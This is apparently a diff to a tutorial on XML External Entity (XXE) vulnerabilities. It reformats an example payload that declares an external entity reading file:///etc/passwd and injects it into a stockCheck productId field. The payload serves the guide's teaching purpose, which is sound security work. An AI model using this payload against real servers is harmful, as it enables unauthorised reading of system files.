@@ -26,13 +26,11 @@ XXE (XML External Entity) vulnerability is a security flaw that occurs when an a
 ```Payload
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE stockCheck [
-    <!ENTITY procuctid SYSTEM "file:///etc/passwd">
-]>
-<stockCheck>
-    <productId>&procuctid;</productId>
-    <storeId>1</storeId></stockCheck>
-</stockCheck>
+    <!DOCTYPE stockCheck [ <!ENTITY procuctid SYSTEM "file:///etc/passwd"> ]>
+    <stockCheck>
+        <productId>&procuctid;</productId>
+        <storeId>1</storeId>
+    </stockCheck>
 ```    
 ---
 
